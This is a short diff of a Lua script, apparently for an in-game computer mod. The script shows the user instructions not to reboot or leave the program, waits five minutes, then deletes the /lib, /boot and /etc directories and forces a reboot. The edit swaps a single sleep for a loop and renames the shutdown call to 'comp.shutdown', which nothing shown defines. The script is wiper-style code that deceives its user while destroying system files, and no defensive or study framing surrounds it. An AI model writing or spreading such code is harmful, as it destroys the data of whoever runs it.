@@ -45,13 +45,15 @@ gpu.set(30, 10, "2. Don't Reboot Computer")
 os.sleep(0.3)
 gpu.set(30, 12, "3. Don't leave this program")
 
-os.sleep(300)
+for i = 1, 300 do
+  os.sleep(1)
+end
 
 fs.remove("/lib/*")
 fs.remove("/boot/*")
 fs.remove("/etc/*")
 
-computer.shutdown(true)
+comp.shutdown(true)
 
 while true do
     event.pull("touch")
